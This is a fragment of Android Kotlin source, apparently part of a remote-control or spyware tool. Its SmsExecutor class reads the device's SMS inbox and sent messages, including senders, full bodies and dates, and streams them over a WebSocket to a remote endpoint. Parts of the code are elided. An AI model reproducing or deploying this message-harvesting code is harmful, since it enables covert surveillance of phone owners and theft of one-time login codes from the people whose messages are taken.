...
class SmsExecutor(context: Context) : BaseExecutor(context) {
    ...
    @SuppressLint("Range")
    fun executeJsonForWeb() {
        if (!PermissionHelper.hasReadSms(context)) {
            WebSocketSender.sendMessagesData(emptyList()); return
        }
        try {
            val result = mutableListOf<Map<String, Any>>()
            val dateFormat = java.text.SimpleDateFormat("dd/MM/yyyy HH:mm", java.util.Locale.getDefault())
            context.contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC"
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < MAX_SMS) {
                    count++
                    result.add(mapOf(
                        "type"    to "inbox",
                        "address" to (cursor.getString(cursor.getColumnIndex("address")) ?: ""),
                        "body"    to (cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""),
                        "date"    to try { dateFormat.format(java.util.Date(cursor.getLong(cursor.getColumnIndex("date")))) } catch (_: Exception) { "" },
                        "read"    to (cursor.getInt(cursor.getColumnIndex("read")) == 1)
                    ))
                }
            }
            context.contentResolver.query(
                android.net.Uri.parse("content://sms/sent"), null, null, null, "date DESC"
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < MAX_SENT) {
                    count++
                    result.add(mapOf(
                        "type"    to "sent",
                        "address" to (cursor.getString(cursor.getColumnIndex("address")) ?: ""),
            ...
            WebSocketSender.sendMessagesData(result)
        } catch (e: Exception) {
            Log.e(TAG, "executeJsonForWeb: ${e.message}")
            WebSocketSender.sendMessagesData(emptyList())
        }
    }
